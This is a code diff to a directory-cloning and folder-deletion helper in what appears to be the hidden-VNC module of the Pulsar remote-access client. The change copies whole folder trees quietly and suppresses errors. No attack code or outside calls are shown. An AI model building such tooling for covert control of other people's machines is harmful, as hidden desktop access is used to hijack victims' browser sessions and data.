@@ -1,10 +1,9 @@
 ﻿using Microsoft.Win32;
 using System;
+using System.Collections.Concurrent;
 using System.Diagnostics;
 using System.IO;
-using System.Net;
 using System.Runtime.InteropServices;
-using System.Threading;
 using System.Threading.Tasks;
 
 namespace Pulsar.Client.Helper.HVNC
@@ -21,33 +20,36 @@ namespace Pulsar.Client.Helper.HVNC
 
         private void CloneDirectory(string sourceDir, string destinationDir)
         {
-            DirectoryInfo directoryInfo = new DirectoryInfo(sourceDir);
-            if (!directoryInfo.Exists)
+            if (!Directory.Exists(sourceDir))
             {
-                throw new DirectoryNotFoundException("Source directory '" + sourceDir + "' does not exist.");
-            }
-            if (!Directory.Exists(destinationDir))
-            {
-                Directory.CreateDirectory(destinationDir);
+                throw new DirectoryNotFoundException($"Source directory '{sourceDir}' not found.");
             }
 
-            Parallel.ForEach(directoryInfo.GetFiles(), fileInfo =>
+            Directory.CreateDirectory(destinationDir);
+
+            var directories = Directory.GetDirectories(sourceDir, "*", SearchOption.AllDirectories);
+            var files = Directory.GetFiles(sourceDir, "*", SearchOption.AllDirectories);
+
+            Parallel.ForEach(directories, dir =>
             {
-                string destFileName = Path.Combine(destinationDir, fileInfo.Name);
                 try
                 {
-                    fileInfo.CopyTo(destFileName, false);
+                    string targetDir = dir.Replace(sourceDir, destinationDir);
+                    Directory.CreateDirectory(targetDir);
                 }
-                catch (IOException ex)
-                {
-                    Console.WriteLine("Could not copy file '" + fileInfo.FullName + "': " + ex.Message);
-                }
+                catch (Exception) { }
             });
 
-            Parallel.ForEach(directoryInfo.GetDirectories(), directoryInfo2 =>
+            Parallel.ForEach(files, file =>
             {
-                string destinationDir2 = Path.Combine(destinationDir, directoryInfo2.Name);
-                this.CloneDirectory(directoryInfo2.FullName, destinationDir2);
+                try
+                {
+                    string targetFile = file.Replace(sourceDir, destinationDir);
+                    File.Copy(file, targetFile, true);
+                }
+                catch (UnauthorizedAccessException) { }
+                catch (IOException) { }
+                catch (Exception) { }
             });
         }
 
@@ -63,13 +65,13 @@ namespace Pulsar.Client.Helper.HVNC
                 }
                 else
                 {
-                    Console.WriteLine("Folder does not exist.");
+                    Debug.WriteLine("Folder does not exist.");
                     result = false;
                 }
             }
             catch (Exception ex)
             {
-                Console.WriteLine("Error deleting folder: " + ex.Message);
+                Debug.WriteLine("Error deleting folder: " + ex.Message);
                 result = false;
             }
             return result;
